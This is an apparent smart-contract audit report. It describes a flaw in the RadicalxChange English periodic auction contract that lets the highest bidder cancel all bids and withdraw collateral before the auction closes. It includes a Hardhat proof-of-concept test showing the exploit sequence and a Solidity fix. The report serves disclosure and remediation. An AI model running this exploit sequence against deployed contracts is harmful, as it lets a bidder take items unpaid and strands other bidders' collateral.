# The Highest Bidder Can Maliciously Cancel His Bid Just Before Closing the Auction

## Summary
The highest bidder can still cancel his bid before closing the auction via [EnglishPeriodicAuctionFacet::cancelAllBidsAndWithdrawCollateral](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/facets/EnglishPeriodicAuctionFacet.sol#L187-L190), thus getting the art for free
## Vulnerability Detail
The requirement to ensure the highest bidder in a round can't cancel his bid is only present when cancelling only [one bid](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L393-L396), a malicious highest bidder can use the [_cancelAllBids](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L378-L412) functionality to bypass this limit and thus abuse the contract.
Please add the below test to `test/auction/EnglishPeriodicAuction.ts`

<summary><b>POC</b></summary>

```typescript
     it('allows highest bidder to cancel and withdraw bid', async function () {
      const instance = await getInstance({
        auctionLengthSeconds: 300,
        initialPeriodStartTime: (await time.latest()) + 100,
        licensePeriod: 1000,
      });

      const licenseMock = await ethers.getContractAt(
        'NativeStewardLicenseMock',
        instance.address,
      );

      // Mint token manually
      const steward = owner.address;
      await licenseMock.mintToken(steward, 0);
      const balance = await ethers.provider.getBalance(instance.address);

      expect(await balance).to.be.equal(0);

      // Start auction
      await time.increase(300);

      const bidAmount1 = ethers.utils.parseEther('1.1');
      const feeAmount1 = await instance.calculateFeeFromBid(bidAmount1);
      const collateralAmount1 = feeAmount1.add(bidAmount1);

      const bidAmount2 = ethers.utils.parseEther('1.2');
      const feeAmount2 = await instance.calculateFeeFromBid(bidAmount2);
      const collateralAmount2 = feeAmount2.add(bidAmount2);

      //first bidder
      await instance
        .connect(bidder1)
        .placeBid(0, bidAmount1, { value: collateralAmount1 });

        //second bidder
      await instance
        .connect(bidder2)
        .placeBid(0, bidAmount2, { value: collateralAmount2 });

      

      await time.increase(100);

      //time elapses without any other bid, bidder2 goes on to then cancel and withdraw his bid
      //before closing the auction
      await instance.connect(bidder2).cancelAllBidsAndWithdrawCollateral(0);

      await instance.connect(bidder2).closeAuction(0);
      expect(await licenseMock.ownerOf(0)).to.be.equal(bidder2.address);
      //attempt to cancel bid for round 0 and then withdraw, will trigger a revert, since the available
      //contract balance isn't upto the bidder's available collateral
      await expect(
        instance.connect(bidder1).cancelBidAndWithdrawCollateral(0, 0),
      ).to.be.reverted;
    });
```

and then run:
```typescript
npx hardhat test test/auction/EnglishPeriodicAuction.ts
```
## Impact
   this will cause one of the following:
+    cause closing of the auction impossible, since the needed fee amount for distribution has already been withdrawn
    this will thus always trigger a revert
+  Make a previous bidder who hasn't yet cancelled his bid unable to, since if the available contract balance is >=
    the fee amount needed for distribution, the closing of the auction will succeed and thus use up the bidder's collateral deposit
+ The previous owner(aka initial bidder/current bidder)will not be able to withdraw his available collateral, since the needed collateral from the highest bidder has already been withdrawn.

To put it simply, the highest bidder can get the art for free

## Tool used

Manual Review

## Recommendation
[_cancelAllBids](_cancelAllBids) should be restricted to current round - 1, it shouldn't cancel the current round's bid, that should be done with [cancelBid](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L378-L412), i.e.
```solidity
    function _cancelAllBids(uint256 tokenId, address bidder) internal {
        EnglishPeriodicAuctionStorage.Layout
            storage l = EnglishPeriodicAuctionStorage.layout();


        uint256 currentAuctionRound = l.currentAuctionRound[tokenId];


+        for (uint256 i = 0; i < currentAuctionRound; i++) { //<-@  <= to <
            Bid storage bid = l.bids[tokenId][i][bidder];


            if (bid.collateralAmount > 0) {
                // Make collateral available to withdraw
                l.availableCollateral[bidder] += bid.collateralAmount;


                // Reset collateral and bid
                bid.collateralAmount = 0;
                bid.bidAmount = 0;
            }
        }
    }
```
